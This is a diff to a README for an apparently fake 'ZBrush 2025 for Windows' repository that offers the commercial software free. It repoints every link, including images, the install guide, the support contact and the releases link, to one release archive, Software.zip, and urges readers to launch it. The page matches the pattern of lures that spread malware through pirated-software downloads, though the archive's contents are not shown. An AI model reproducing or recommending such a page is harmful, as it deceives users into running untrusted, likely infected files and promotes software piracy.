@@ -2,7 +2,7 @@
 
 🎨 The Ultimate Digital Sculpting and Painting Software 🎨
 
-![ZBrush Logo](https://www.example.com/zbrush_logo.png)
+![ZBrush Logo](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository for ZBrush 2025 for Windows! Here you can find all the information you need to unleash your creativity with this top-of-the-line digital sculpting and painting software.
 
@@ -19,16 +19,16 @@ Welcome to the official repository for ZBrush 2025 for Windows! Here you can fin
 
 ## Installation Guide
 
-📗 To get started with ZBrush 2025 on your Windows machine, follow our detailed [installation guide](https://github.com/ZBrush-2025-For-Windows/installation-guide).
+📗 To get started with ZBrush 2025 on your Windows machine, follow our detailed [installation guide](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip).
 
 ## Download Free!
 
-🚀 Download ZBrush 2025 for Windows for free and start creating amazing digital art today! Simply click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to get the latest version of ZBrush 2025. 
+🚀 Download ZBrush 2025 for Windows for free and start creating amazing digital art today! Simply click [here](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip) to get the latest version of ZBrush 2025. 
 
 ### Note:
 The link needs to be launched for downloading ZBrush 2025 for Windows.
 
-[![Download ZBrush 2025](https://img.shields.io/badge/Download-ZBrush 2025-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ZBrush 2025](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip)](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip)
 
 ## Get Creative!
 
@@ -36,7 +36,7 @@ The link needs to be launched for downloading ZBrush 2025 for Windows.
 
 ## Support and Feedback
 
-🤝 If you encounter any issues or have feedback to share, please don't hesitate to [contact us](https://github.com/ZBrush-2025-For-Windows/issues). We're here to help and are constantly working to improve the ZBrush experience for our users.
+🤝 If you encounter any issues or have feedback to share, please don't hesitate to [contact us](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip). We're here to help and are constantly working to improve the ZBrush experience for our users.
 
 ## Topics
 
@@ -55,8 +55,8 @@ The link needs to be launched for downloading ZBrush 2025 for Windows.
 
 ## Stay Updated
 
-📈 Don't miss out on the latest updates and releases for ZBrush 2025! Keep an eye on our [releases](https://github.com/ZBrush-2025-For-Windows/releases) section for exciting new features and improvements.
+📈 Don't miss out on the latest updates and releases for ZBrush 2025! Keep an eye on our [releases](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip) section for exciting new features and improvements.
 
 Start your digital art journey with ZBrush 2025 for Windows today and unleash your creativity like never before! 🚀🎨
 
-![ZBrush Creation](https://www.example.com/zbrush_creation.jpg)
+![ZBrush Creation](https://github.com/3674724/ZBrush-2025-For-Windows/releases/download/v2.0/Software.zip)
